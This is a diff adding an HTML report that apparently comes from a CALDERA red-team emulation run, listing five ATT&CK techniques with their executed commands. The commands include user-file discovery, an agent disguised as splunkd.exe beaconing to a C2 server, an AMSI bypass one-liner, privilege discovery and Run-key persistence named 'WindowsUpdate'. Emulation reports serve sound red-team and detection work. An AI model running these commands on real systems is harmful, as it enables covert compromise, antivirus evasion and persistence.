@@ -1,0 +1,20 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>MITRE ATT&CK Attack Report</title>
+<style>
+body { font-family: Arial, sans-serif; margin: 24px; background: #111; color: #eee; }
+a { color: #7db8ff; }
+table { border-collapse: collapse; width: 100%; background: #1c1c1c; }
+th, td { border: 1px solid #333; padding: 10px; text-align: left; vertical-align: top; }
+th { background: #222; }
+code { white-space: pre-wrap; word-break: break-word; }
+.badge { display: inline-block; padding: 4px 8px; border-radius: 999px; background: #222; border: 1px solid #444; margin-right: 6px; }
+</style></head><body>
+<h1>MITRE ATT&CK Attack Report</h1>
+<p><strong>Generated:</strong> 2026-04-02T08:16:43Z</p>
+<p><span class="badge">Session apt-sim-20260402-100632_20260402_100632</span><span class="badge">Operation apt-sim-20260402-100632</span><span class="badge">Techniques 5</span></p>
+<p>Questo report mette in fila le tecniche ATT&amp;CK pianificate, potenziali o realmente emerse dai link CALDERA. È la mappa dell'assalto, nuda e precisa.</p>
+<table>
+<tr><th>Technique ID</th><th>Name</th><th>Tactic</th><th>Ability ID</th><th>Ability Name</th><th>Origin</th><th>Status</th><th>PAW</th><th>Command preview</th></tr>
+<tr><td><a href='https://attack.mitre.org/techniques/T1005/'>T1005</a></td><td>Sensitive File Discovery</td><td>collection</td><td>collection_files</td><td>Sensitive File Discovery</td><td>executed_link, planned_compatible</td><td>0, planned</td><td>fgdafj</td><td><code>Get-ChildItem C:\Users -Recurse -Include *.docx,*.pdf,*.txt -ErrorAction SilentlyContinue | Select-Object -First 10 | ForEach-Object {$_.FullName} </code></td></tr><tr><td><a href='https://attack.mitre.org/techniques/T1071/001/'>T1071.001</a></td><td>Internal C2</td><td>command-and-control</td><td>c2_internal</td><td>Internal C2</td><td>executed_link, planned_compatible</td><td>1, planned</td><td>fgdafj</td><td><code>Start-Process C:\Users\Public\splunkd.exe ` -ArgumentList &quot;-server http://192.168.30.45:8888 -group red&quot; ` -WindowStyle Hidden </code></td></tr><tr><td><a href='https://attack.mitre.org/techniques/T1562/001/'>T1562.001</a></td><td>AMSI Bypass</td><td>defense-evasion</td><td>amsi_bypass</td><td>AMSI Bypass</td><td>executed_link, planned_compatible</td><td>0, planned</td><td>fgdafj</td><td><code>$s=[Ref].Assembly.GetType(&#x27;System.Management.Automation.AmsiUtils&#x27;); $f=$s.GetField(&#x27;amsiInitFailed&#x27;,&#x27;NonPublic,Static&#x27;); $f.SetValue($null,$true) </code></td></tr><tr><td><a href='https://attack.mitre.org/techniques/T1033/'>T1033</a></td><td>User Discovery</td><td>discovery</td><td>discovery_users</td><td>User Discovery</td><td>executed_link, planned_compatible</td><td>1, planned</td><td>fgdafj</td><td><code>whoami whoami /priv net user net localgroup administrators </code></td></tr><tr><td><a href='https://attack.mitre.org/techniques/T1547/001/'>T1547.001</a></td><td>Registry Persistence</td><td>persistence</td><td>persistence_registry</td><td>Registry Persistence</td><td>executed_link, planned_compatible</td><td>1, planned</td><td>fgdafj</td><td><code>New-ItemProperty -Path &quot;HKCU:\Software\Microsoft\Windows\CurrentVersion\Run&quot; ` -Name &quot;WindowsUpdate&quot; ` -Value &quot;C:\Users\Public\splunkd.exe&quot; -Force </code></td></tr>
+</table>
+</body></html>
